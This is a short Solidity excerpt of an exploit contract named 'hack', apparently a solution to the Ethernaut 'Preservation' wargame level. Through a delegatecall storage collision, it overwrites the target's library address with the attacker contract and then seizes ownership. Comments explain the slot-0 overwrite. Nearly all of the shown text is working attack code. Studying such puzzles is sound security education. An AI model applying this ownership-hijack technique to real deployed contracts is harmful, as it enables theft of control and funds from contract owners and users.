...
contract hack 
{
  ...
  function calculate_address_in_uint () public  view  returns (uint)  
  {
        return uint256(uint160(address(this)));       // calculate address in uint datatype that i can pass in setFirstTime() that will update slot 0 because it timeZone1Library contract is similar to  LibraryContract sample that are given so uint storedTime;  will override   address public timeZone1Library;  contract storage slor (=0)
  }
  function attack(Preservation i) public 
  {
    i.setFirstTime(calculate_address_in_uint());  // Now timeZone1Library = address(this)
    i.setFirstTime(123);                         // == Preservation delgate call  ---> setTime() of address(this)    
    require(i.owner() == tx.origin,"fail mc");
  }
}
